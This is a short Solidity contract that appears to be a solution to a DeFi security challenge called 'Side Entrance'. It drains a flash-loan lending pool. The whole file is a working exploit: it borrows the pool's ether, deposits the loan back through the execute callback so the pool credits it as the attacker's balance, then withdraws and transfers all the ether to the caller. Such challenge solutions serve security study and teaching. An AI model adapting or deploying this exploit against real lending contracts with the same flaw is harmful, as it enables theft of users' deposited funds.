// SPDX-License-Identifier: MIT
pragma solidity ^ 0.8.0;

interface IAttackSideEntranceLenderPool {
  function deposit() external payable;
  function withdraw() external;
  function flashLoan(uint256 amount) external;
}

interface IFlashLoanEtherReceiver {
  function execute() external payable;
}

contract AttackSideEntranceLenderPool is IFlashLoanEtherReceiver {

  IAttackSideEntranceLenderPool internal _pool;
  uint256 internal _attackAmount;

  constructor(address pool, uint256 ETHER_IN_POOL) {
    _pool = IAttackSideEntranceLenderPool(pool);
    _attackAmount = ETHER_IN_POOL;
  }

  function execute() external payable override {
    _pool.deposit{value: msg.value}();
  }

  function attack() external {
    _pool.flashLoan(_attackAmount);
    _pool.withdraw();
    payable(msg.sender).transfer(_attackAmount);
  }

  receive() external payable {}

}
